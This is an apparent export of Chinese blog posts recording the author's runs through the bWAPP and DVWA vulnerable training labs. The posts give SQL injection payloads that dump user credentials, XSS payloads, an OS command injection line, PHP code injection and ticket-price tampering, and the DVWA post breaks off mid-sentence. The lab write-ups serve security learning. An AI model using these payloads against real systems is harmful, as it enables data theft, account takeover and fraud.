[{"title":"BWAPP打靶随记","url":"/2023/06/30/BWAPP%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<p>这篇文章的靶场是bwapp靶场</p>\n<span id=\"more\"></span>\n\n<p>迎面而来的第一个靶场是html注入</p>\n<p>这给我搞懵了，没听说过啊？</p>\n<p>立刻打开chatgpt询问：</p>\n\n\n<hr>\n<p>废话不多说，开始打靶！</p>\n<p><strong>注：本靶场的大部分Medium和High无法攻破，不记录</strong></p>\n<h1 id=\"SQL-Injection-GET-x2F-Search\"><a href=\"#SQL-Injection-GET-x2F-Search\" class=\"headerlink\" title=\"SQL Injection (GET&#x2F;Search)\"></a>SQL Injection (GET&#x2F;Search)</h1><ol>\n<li><p>判断闭合为单引号</p>\n</li>\n<li><p>判断字段数为7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?title=宝宝巴士&#x27; order by 7--+&amp;action=search<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>注出回显点为2，3，4，5</p>\n</li>\n<li><p>获取表名 blog,heroes,movies,users,visitors</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?title=&#x27; UNION SELECT 1,2,3,4,group_concat(table_name),6,7 from information_schema.tables where table_schema=database()--+&amp;action=search<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取列名 id,login,password,email,secret,activation_code,activated,reset_code,admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?title=&#x27; UNION SELECT 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;--+&amp;action=search<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>获取全部数据（这里只获取部分）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?title=&#x27; UNION SELECT 1,2,3,4,group_concat(id,&#x27;:&#x27;,login,&#x27;-&#x27;,password),6,7 from users--+&amp;action=search<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"SQL-Injection-GET-x2F-Select\"><a href=\"#SQL-Injection-GET-x2F-Select\" class=\"headerlink\" title=\"SQL Injection (GET&#x2F;Select)\"></a>SQL Injection (GET&#x2F;Select)</h1><p>测试出这是数字型注入</p>\n<p>这一关只给了我们id&#x3D;多少的电影，推测后台语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select * from movies where id=$id<br></code></pre></td></tr></table></figure>\n\n<p>推测出了这个那构造语句就不难了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?movie=6 and extractvalue(1,concat(0x7e,(database())))&amp;action=go<br></code></pre></td></tr></table></figure>\n\n<p>之后的略</p>\n<h1 id=\"SQL-Injection-POST-x2F-Search\"><a href=\"#SQL-Injection-POST-x2F-Search\" class=\"headerlink\" title=\"SQL Injection (POST&#x2F;Search)\"></a>SQL Injection (POST&#x2F;Search)</h1><p>这是搜索型注入，一般的语句都是这样的：</p>\n<p>一个百分号加上单引号闭合的，但加不加都不影响注入 </p>\n<p>bp拦截之后放到hackbar然后开始构造语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">title=a&#x27; and extractvalue(1,concat(0x7e,(database())))#&amp;action=search<br></code></pre></td></tr></table></figure>\n\n<p>之后的略</p>\n<h1 id=\"SQL-Injection-POST-x2F-Select\"><a href=\"#SQL-Injection-POST-x2F-Select\" class=\"headerlink\" title=\"SQL Injection (POST&#x2F;Select)\"></a>SQL Injection (POST&#x2F;Select)</h1><p>数字型注入，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">movie=1 and extractvalue(1,concat(0x7e,(database())))&amp;action=go<br></code></pre></td></tr></table></figure>\n\n<p>剩下的略</p>\n<h1 id=\"SQL-Injection-AJAX-x2F-JSON-x2F-jQuery\"><a href=\"#SQL-Injection-AJAX-x2F-JSON-x2F-jQuery\" class=\"headerlink\" title=\"SQL Injection (AJAX&#x2F;JSON&#x2F;jQuery)\"></a>SQL Injection (AJAX&#x2F;JSON&#x2F;jQuery)</h1><p>ajax他是一个异步通讯，能够在网页不刷新的情况下，刷新网页内部的东西<br>而它的返回值一般是json&#x2F;xml格式的，jQuery中提供实现ajax的方法</p>\n<p>payload和前面的Sql Injection (GET&#x2F;Search)一样</p>\n<h1 id=\"SQL-Injection-CAPTCHA\"><a href=\"#SQL-Injection-CAPTCHA\" class=\"headerlink\" title=\"SQL Injection (CAPTCHA)\"></a>SQL Injection (CAPTCHA)</h1><p>输入验证码之后就和Sql Injection (GET&#x2F;Search)一样了，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?title=a&#x27; and extractvalue(1,concat(0x7e,(database())))--+&amp;action=search<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"SQL-Injection-Login-Form-x2F-Hero\"><a href=\"#SQL-Injection-Login-Form-x2F-Hero\" class=\"headerlink\" title=\"SQL Injection (Login Form&#x2F;Hero)\"></a>SQL Injection (Login Form&#x2F;Hero)</h1><p>登录界面。。尝试万能密码————成功</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">admin&#x27; and extractvalue(1,concat(0x7e,(database())))#<br></code></pre></td></tr></table></figure>\n\n<p>后面的略</p>\n<h1 id=\"SQL-Injection-Login-Form-x2F-User-96\"><a href=\"#SQL-Injection-Login-Form-x2F-User-96\" class=\"headerlink\" title=\"SQL Injection (Login Form&#x2F;User)&#96;\"></a>SQL Injection (Login Form&#x2F;User)&#96;</h1><p>这一关我做了很久没有做出来，看了一下wt还是有点似懂非懂，留个坑后面回来补</p>\n<h1 id=\"SQL-Injection-SQLite\"><a href=\"#SQL-Injection-SQLite\" class=\"headerlink\" title=\"SQL Injection (SQLite)\"></a>SQL Injection (SQLite)</h1><p>这一关需要sqllite这个module，我懒得安装了直接看wt去吧</p>\n<p>其实和最简单的sql注入没有任何区别</p>\n<h1 id=\"Drupal-SQL-Injection-Drupageddon\"><a href=\"#Drupal-SQL-Injection-Drupageddon\" class=\"headerlink\" title=\"Drupal SQL Injection (Drupageddon)\"></a>Drupal SQL Injection (Drupageddon)</h1><blockquote>\n<p>The <a href=\"http://127.0.0.1/drupal/\">Drupal</a> version is vulnerable to SQL injection! (<a href=\"http://sourceforge.net/projects/bwapp/files/bee-box/\">bee-box</a> only)</p>\n<p>HINT: <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704\">CVE-2014-3704</a></p>\n</blockquote>\n<p>这一关的靶场环境依旧懒得搭建，不过既然是cve漏洞就可以使用msf一把梭</p>\n<p>可以看看这篇wt：</p>\n<p><a href=\"https://blog.csdn.net/angry_program/article/details/104545171\">https://blog.csdn.net/angry_program/article/details/104545171</a></p>\n<h1 id=\"SQL-Injection-Stored-Blog\"><a href=\"#SQL-Injection-Stored-Blog\" class=\"headerlink\" title=\"SQL Injection - Stored (Blog)\"></a>SQL Injection - Stored (Blog)</h1><p>这乍一眼一看，xss注入，但是这同样会涉及到indert、delete注入（之前pikachu有一道类似的）</p>\n<p>不用看，直接构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;<br></code></pre></td></tr></table></figure>\n\n<p>成功！</p>\n<h1 id=\"SQL-Injection-Stored-SQLite\"><a href=\"#SQL-Injection-Stored-SQLite\" class=\"headerlink\" title=\"SQL Injection - Stored (SQLite)\"></a>SQL Injection - Stored (SQLite)</h1><p>Mysql换成了sqlite，只是些sql语句写法变了, 思路不变</p>\n<h1 id=\"SQL-Injection-Stored-User-Agent\"><a href=\"#SQL-Injection-Stored-User-Agent\" class=\"headerlink\" title=\"SQL Injection - Stored (User-Agent)\"></a>SQL Injection - Stored (User-Agent)</h1><p>看到标题就知道要干什么了，然后下面有一个表格记录我们的ua，那就是ua下的insert注入，我们把上一关的payload放到ua里面即可</p>\n\n\n<h1 id=\"SQL-Injection-Stored-XML\"><a href=\"#SQL-Injection-Stored-XML\" class=\"headerlink\" title=\"SQL Injection - Stored (XML)\"></a>SQL Injection - Stored (XML)</h1>\n\n<p>但是这怎么利用呢？？抓包看看</p>\n\n\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">reset</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">login</span>&gt;</span>bee<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">login</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">secret</span>&gt;</span>Any bugs?<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">secret</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">reset</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>ok啊，豁然开朗，他应该是把标签里面夹着的东西insert进去了，那我们对标签里面的内容进行注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;reset&gt;&lt;login&gt;&#x27; or extractvalue(1,concat(0x7e,(database()))) or &#x27;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;<br></code></pre></td></tr></table></figure>\n\n\n\n<p>芜湖！~</p>\n<h1 id=\"SQL-Injection-Blind-Boolean-Based\"><a href=\"#SQL-Injection-Blind-Boolean-Based\" class=\"headerlink\" title=\"SQL Injection - Blind - Boolean-Based\"></a>SQL Injection - Blind - Boolean-Based</h1><p>判断闭合单引号，测试是否具备盲注条件，为了测试先找一个电影吧：G.I. Joe: Retaliation</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?title=G.I. Joe: Retaliation&#x27; and 1=1 --+&amp;action=search   exists 正常<br>?title=G.I. Joe: Retaliation&#x27; and 1=2 --+&amp;action=search   does not exists 不正常<br></code></pre></td></tr></table></figure>\n\n<p>具备注入条件，后面的略</p>\n<h1 id=\"SQL-Injection-Blind-Time-Based\"><a href=\"#SQL-Injection-Blind-Time-Based\" class=\"headerlink\" title=\"SQL Injection - Blind - Time-Based\"></a>SQL Injection - Blind - Time-Based</h1><p>看标题，时间盲注，直接构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">G.I. Joe: Retaliation&#x27; and sleep(if((1=2), 0, 3)) #    延时<br>G.I. Joe: Retaliation&#x27; and sleep(if((1=1), 0, 3)) #    不延时<br></code></pre></td></tr></table></figure>\n\n<p>具备注入条件，后面的略</p>\n<h1 id=\"SQL-Injection-Blind-SQLite\"><a href=\"#SQL-Injection-Blind-SQLite\" class=\"headerlink\" title=\"SQL Injection - Blind (SQLite)\"></a>SQL Injection - Blind (SQLite)</h1><p>同SQL Injection - Blind - Boolean-Based</p>\n<h1 id=\"SQL-Injection-Blind-WS-x2F-SOAP\"><a href=\"#SQL-Injection-Blind-WS-x2F-SOAP\" class=\"headerlink\" title=\"SQL Injection - Blind (WS&#x2F;SOAP)\"></a>SQL Injection - Blind (WS&#x2F;SOAP)</h1><p>字符型注入, 猜测sql语句如下:</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-keyword\">select</span> tickets <span class=\"hljs-keyword\">from</span> moives <span class=\"hljs-keyword\">where</span> title=<span class=\"hljs-string\">&#x27;$title&#x27;</span>;<br></code></pre></td></tr></table></figure>\n\n<p>那后面的盲注就简单了，略</p>\n<hr>\n<p>至此，bwapp的sql靶场结束，开始xss部分</p>\n<h1 id=\"XSS-Reflected-GET\"><a href=\"#XSS-Reflected-GET\" class=\"headerlink\" title=\"XSS - Reflected (GET)\"></a>XSS - Reflected (GET)</h1><p>这一关有两个输入框，我们将两个最简单的payload放两个框里面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>就弹窗了</p>\n<h1 id=\"XSS-Reflected-POST\"><a href=\"#XSS-Reflected-POST\" class=\"headerlink\" title=\"XSS - Reflected (POST)\"></a>XSS - Reflected (POST)</h1><p>和上一关payload一样，只是换了get和post的提交方式而已</p>\n<h1 id=\"XSS-Reflected-JSON\"><a href=\"#XSS-Reflected-JSON\" class=\"headerlink\" title=\"XSS - Reflected (JSON)\"></a>XSS - Reflected (JSON)</h1><p>我们随便输入一个字符“a”，查看页面源代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">var JSONResponseString = &#x27;&#123;&quot;movies&quot;:[&#123;&quot;response&quot;:&quot;a??? Sorry, we don&amp;#039;t have that movie :(&quot;&#125;]&#125;&#x27;;<br></code></pre></td></tr></table></figure>\n\n\n\n<p>可以看到单引号被实体化了，并且这里我们需要注意闭合，构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&quot;&#125;]&#125;&#x27;alert(1)//<br></code></pre></td></tr></table></figure>\n\n<p>注意这里需要使用注释符把后面的东西给注释掉不影响代码的执行，并且这里的alert弹窗不需要左右标签script，因为json是在页面内加载的</p>\n<h1 id=\"XSS-Reflected-AJAX-x2F-JSON\"><a href=\"#XSS-Reflected-AJAX-x2F-JSON\" class=\"headerlink\" title=\"XSS - Reflected (AJAX&#x2F;JSON)\"></a>XSS - Reflected (AJAX&#x2F;JSON)</h1><p>ajax就是异步的意思，立刻做出反应回显</p>\n<p>但是这一关我似乎环境出现了问题，对我的输入没有反应。。。。那就给一个wt的payload吧</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"XSS-Reflected-AJAX-x2F-XML\"><a href=\"#XSS-Reflected-AJAX-x2F-XML\" class=\"headerlink\" title=\"XSS - Reflected (AJAX&#x2F;XML)\"></a>XSS - Reflected (AJAX&#x2F;XML)</h1><p>同样环境有问题。。。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">οnerrοr</span>=<span class=\"hljs-string\">alert(/xss/)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"XSS-Reflected-Back-Button\"><a href=\"#XSS-Reflected-Back-Button\" class=\"headerlink\" title=\"XSS - Reflected (Back Button)\"></a>XSS - Reflected (Back Button)</h1><p>是个clickbutton，bp抓包，但是我们不知道我们应该把注入语句放在哪里，打开源代码看看</p>\n\n\n<p>referer注入，并且需要闭合，构造出payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&quot;&gt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-regexp\">/xss/</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>成功</p>\n<h1 id=\"XSS-Reflected-Custom-Header\"><a href=\"#XSS-Reflected-Custom-Header\" class=\"headerlink\" title=\"XSS - Reflected (Custom Header)\"></a>XSS - Reflected (Custom Header)</h1><p>做不出来。。。。跟着wt做也还是没有成功，应该是环境的问题</p>\n\n\n<h1 id=\"XSS-Reflected-Eval\"><a href=\"#XSS-Reflected-Eval\" class=\"headerlink\" title=\"XSS - Reflected (Eval)\"></a>XSS - Reflected (Eval)</h1><p>这一关显示出来了现在的时间，再看上面的url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://127.0.0.1/bwapp/xss_eval.php?date=Date()<br></code></pre></td></tr></table></figure>\n\n<p>执行了Date()函数，再看标题，看来是使用了eval函数，我们可以再url里面注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://127.0.0.1/bwapp/xss_eval.php?date=alert(1)<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"XSS-Reflected-HREF\"><a href=\"#XSS-Reflected-HREF\" class=\"headerlink\" title=\"XSS - Reflected (HREF)\"></a>XSS - Reflected (HREF)</h1><p>查看页面源代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;td align=&quot;center&quot;&gt; &lt;a href=xss_href-3.php?movie=1&amp;name=aaaaction=vote&amp;action=vote&gt;Vote&lt;/a&gt;&lt;/td&gt;<br></code></pre></td></tr></table></figure>\n\n<p>闭合即可，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&gt;&lt;img src=1 onerror=alert(1)&gt;//<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"XSS-Reflected-Login-Form\"><a href=\"#XSS-Reflected-Login-Form\" class=\"headerlink\" title=\"XSS - Reflected (Login Form)\"></a>XSS - Reflected (Login Form)</h1><p>一看到登录页面就第一个想到了万能密码，但是xss的登录密码怎么构造呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or 1=1;&quot;&lt;img src=1 onerror=alert(/xss/)&gt;&quot;<br></code></pre></td></tr></table></figure>\n\n<p>实现原理：通过数据库报错将payload回显，从而触发xss</p>\n<h1 id=\"phpMyAdmin-BBCode-Tag-XSS\"><a href=\"#phpMyAdmin-BBCode-Tag-XSS\" class=\"headerlink\" title=\"phpMyAdmin BBCode Tag XSS\"></a>phpMyAdmin BBCode Tag XSS</h1><p>CVE，且需要bee box，看wt吧</p>\n<h1 id=\"XSS-Reflected-PHP-SELF\"><a href=\"#XSS-Reflected-PHP-SELF\" class=\"headerlink\" title=\"XSS - Reflected (PHP_SELF)\"></a>XSS - Reflected (PHP_SELF)</h1><p>同XSS - Reflected (GET)</p>\n<h1 id=\"XSS-Reflected-Referer\"><a href=\"#XSS-Reflected-Referer\" class=\"headerlink\" title=\"XSS - Reflected (Referer)\"></a>XSS - Reflected (Referer)</h1><p>referer注入，把payload放到referer里面就可以了，上一关的payload放到referer即可，因为页面展示出来了当前用户的referer：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"XSS-Reflected-User-Agent\"><a href=\"#XSS-Reflected-User-Agent\" class=\"headerlink\" title=\"XSS - Reflected (User-Agent)\"></a>XSS - Reflected (User-Agent)</h1><p>上一关的payload放到ua即可，因为页面展示出来了当前用户的ua</p>\n<h1 id=\"XSS-Stored-Blog\"><a href=\"#XSS-Stored-Blog\" class=\"headerlink\" title=\"XSS - Stored (Blog)\"></a>XSS - Stored (Blog)</h1><p>把上一关的payload放到留言板即可，这是个存储型xss，因此刷新之后一直有</p>\n<h1 id=\"XSS-Stored-Change-Secret\"><a href=\"#XSS-Stored-Change-Secret\" class=\"headerlink\" title=\"XSS - Stored (Change Secret)\"></a>XSS - Stored (Change Secret)</h1><p>输入payload之后并不会弹窗，看样子是会存储进数据库，那我们看看输入单引号会不会报错，，，没有，因此不能通过报错回显来注入</p>\n<p>查看网页源代码，发现有一个名为login的隐藏的输入框</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;input type=&quot;hidden&quot; name=&quot;login&quot; value=&quot;bee&quot;&gt;<br></code></pre></td></tr></table></figure>\n\n\n\n<p>用burp抓包，发现提交了三个参数：secret、login、action，那login这一框应该就是对应的这个隐藏的输入框了，构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;<br></code></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"XSS-Stored-Cookies\"><a href=\"#XSS-Stored-Cookies\" class=\"headerlink\" title=\"XSS - Stored (Cookies)\"></a>XSS - Stored (Cookies)</h1><p>这道题做了半天还是不懂，wt里面讲不清楚，找到了一篇韩国佬的wt：</p>\n<p><a href=\"http://securitycode.tistory.com/200\">http://securitycode.tistory.com/200</a></p>\n<p>讲的不错</p>\n<h1 id=\"SQLiteManager\"><a href=\"#SQLiteManager\" class=\"headerlink\" title=\"SQLiteManager\"></a>SQLiteManager</h1><blockquote>\n<p>The <a href=\"http://127.0.0.1/sqlite/\">SQLiteManager</a> version is vulnerable to Cross-Site Scripting! (<a href=\"http://sourceforge.net/projects/bwapp/files/bee-box/\">bee-box</a> only)</p>\n<p>HINT: <a href=\"http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5105\">CVE-2012-5105</a></p>\n</blockquote>\n<p>跳过</p>\n<h1 id=\"XSS-Stored-User-Agent\"><a href=\"#XSS-Stored-User-Agent\" class=\"headerlink\" title=\"XSS - Stored (User-Agent)\"></a>XSS - Stored (User-Agent)</h1><p>把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>放到ua里面就可以了</p>\n<hr>\n<p>至此xss的部分就结束了</p>\n<h1 id=\"HTML-Injection-Reflected-GET\"><a href=\"#HTML-Injection-Reflected-GET\" class=\"headerlink\" title=\"HTML Injection - Reflected (GET)\"></a>HTML Injection - Reflected (GET)</h1><p>这一关有两个输入框，我们将两个最简单的payload放两个框里面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>就弹窗了，和XSS - Reflected (GET)一样</p>\n<h1 id=\"HTML-Injection-Reflected-POST\"><a href=\"#HTML-Injection-Reflected-POST\" class=\"headerlink\" title=\"HTML Injection - Reflected (POST)\"></a>HTML Injection - Reflected (POST)</h1><p>同上，和XSS - Reflected (POST)一样</p>\n<h1 id=\"HTML-Injection-Reflected-URL\"><a href=\"#HTML-Injection-Reflected-URL\" class=\"headerlink\" title=\"HTML Injection - Reflected (URL)\"></a>HTML Injection - Reflected (URL)</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?a=&lt;script&gt;alert(/xss/)&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<p>没什么好说的吧这个太简单了</p>\n<h1 id=\"HTML-Injection-Stored-Blog\"><a href=\"#HTML-Injection-Stored-Blog\" class=\"headerlink\" title=\"HTML Injection - Stored (Blog)\"></a>HTML Injection - Stored (Blog)</h1><p>这道题不是之前做过了吗？直接插入注入语句就可以弹窗了：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-regexp\">/xss/</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"iFrame-Injection\"><a href=\"#iFrame-Injection\" class=\"headerlink\" title=\"iFrame Injection\"></a>iFrame Injection</h1><p>这一关看上去似乎是一个robots君子协议的文件，不知道从哪里下手。。。但是我们看标题，给了我们提示，Frame的意思是“框架”，似乎和这道题的语境没有什么关系</p>\n<p>我们可以再想一想，既然是robots.txt，我们直接访问可以吗？发现自己访问同样是可以的，那为什么多此一举写一个文件帮我们读取呢？此时就可以想到文件包含漏洞！</p>\n<p>尝试让他访问靶场根目录的phpinfo.php</p>\n\n\n<p>成功利用文件包含漏洞</p>\n<h1 id=\"LDAP-Connection-Settings\"><a href=\"#LDAP-Connection-Settings\" class=\"headerlink\" title=\"LDAP Connection Settings\"></a>LDAP Connection Settings</h1><p>因为要安装环境，看wp：</p>\n<p><a href=\"https://blog.csdn.net/hee_mee/article/details/108568839\">https://blog.csdn.net/hee_mee/article/details/108568839</a></p>\n<h1 id=\"OS-Command-Injection\"><a href=\"#OS-Command-Injection\" class=\"headerlink\" title=\"OS Command Injection\"></a>OS Command Injection</h1>\n\n<p>这道题曾经才ctf做过，利用管道符“&amp;”实现一行命令执行多条命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">www.nsa.gov &amp; ipconfig<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"PHP-Code-Injection\"><a href=\"#PHP-Code-Injection\" class=\"headerlink\" title=\"PHP Code Injection\"></a>PHP Code Injection</h1><p>url:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://127.0.0.1/bwapp/phpi.php?message=test<br></code></pre></td></tr></table></figure>\n\n<p>message参数输入什么，页面就打印什么，因此phpi.php这个文件可能就是获取参数message的值然后echo出来，我们可以尝试让他自动执行一些函数，例如phpinfo()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://127.0.0.1/bwapp/phpi.php?message=phpinfo()<br></code></pre></td></tr></table></figure>\n\n<p>就成功了</p>\n<h1 id=\"Server-Side-Includes-SSI-Injection\"><a href=\"#Server-Side-Includes-SSI-Injection\" class=\"headerlink\" title=\"Server-Side Includes (SSI) Injection\"></a>Server-Side Includes (SSI) Injection</h1><p>又是beebox only….</p>\n<blockquote>\n<p>SSI是用于向HTML页面提供动态内容的Web应用程序上的指令。 它们与CGI类似，不同之处在于SSI用于在加载当前页面之前或在页面可视化时执行某些操作。 为此，Web服务器在将页面提供给用户之前分析SSI。</p>\n</blockquote>\n<p>SSI基本格式<code>&lt;!-– 指令名称=&quot;指令参数&quot;&gt;</code></p>\n<p>但是依旧有xss注入，同HTML Injection - Reflected (GET)</p>\n<h1 id=\"x2F-A2-Broken-Auth-amp-Session-Mgmt-x2F\"><a href=\"#x2F-A2-Broken-Auth-amp-Session-Mgmt-x2F\" class=\"headerlink\" title=\"&#x2F; A2 - Broken Auth. &amp; Session Mgmt. &#x2F;\"></a>&#x2F; A2 - Broken Auth. &amp; Session Mgmt. &#x2F;</h1><p>这一整章暂时不做了，后面<strong>可能</strong>会回来补</p>\n<p><a href=\"https://blog.csdn.net/loseheart157/article/details/107986121\">https://blog.csdn.net/loseheart157/article/details/107986121</a></p>\n<h1 id=\"Insecure-DOR-Change-Secret\"><a href=\"#Insecure-DOR-Change-Secret\" class=\"headerlink\" title=\"Insecure DOR (Change Secret)\"></a>Insecure DOR (Change Secret)</h1><p>同XSS - Stored (Change Secret)</p>\n<p>我们可以借此重置别人的secret，实战中可以用来任意密码重置</p>\n<h1 id=\"Insecure-DOR-Reset-Secret\"><a href=\"#Insecure-DOR-Reset-Secret\" class=\"headerlink\" title=\"Insecure DOR (Reset Secret)\"></a>Insecure DOR (Reset Secret)</h1><p>同SQL Injection - Stored (XML)，其他同上</p>\n<h1 id=\"Insecure-DOR-Order-Tickets\"><a href=\"#Insecure-DOR-Order-Tickets\" class=\"headerlink\" title=\"Insecure DOR (Order Tickets)\"></a>Insecure DOR (Order Tickets)</h1><p>订票小程序，抓包看看报文：</p>\n\n\n<p>欸？ticket price竟然在报文里面而不是后端的？那我们直接改成0，就可以实现免费购票了！</p>\n\n\n","categories":["Web"],"tags":["xss"]},{"title":"DVWA打靶随记","url":"/2023/06/19/DVWA%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<p>这篇文章的靶场是DVWA</p>\n<span id=\"more\"></span>\n\n<p>简单配置一下靶场环境，开始！</p>\n<p>注：靶场的impossible难度无法攻破，不记录</p>\n<h1 id=\"Sql-Injection\"><a href=\"#Sql-Injection\" class=\"headerlink\" title=\"Sql-Injection\"></a>Sql-Injection</h1><h2 id=\"Low\"><a href=\"#Low\" class=\"headerlink\" title=\"Low\"></a>Low</h2><p>这一段就是极其简单的字符型注入，</p>\n<p>payload大概这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; union select 1,(注入语句)--+<br></code></pre></td></tr></table></figure>\n\n<p>没什么好讲的</p>\n<h2 id=\"Medium\"><a href=\"#Medium\" class=\"headerlink\" title=\"Medium\"></a>Medium</h2><p>这一关是post注入，burp抓一下包然后注入即可</p>\n<p><strong>注意在post注入中的注释不可以使用“–+”</strong>！！！</p>\n<p>之后的流程同上，就是在post那里编辑</p>\n<h2 id=\"High\"><a href=\"#High\" class=\"headerlink\" title=\"High\"></a>High</h2><p>这一关让你改id 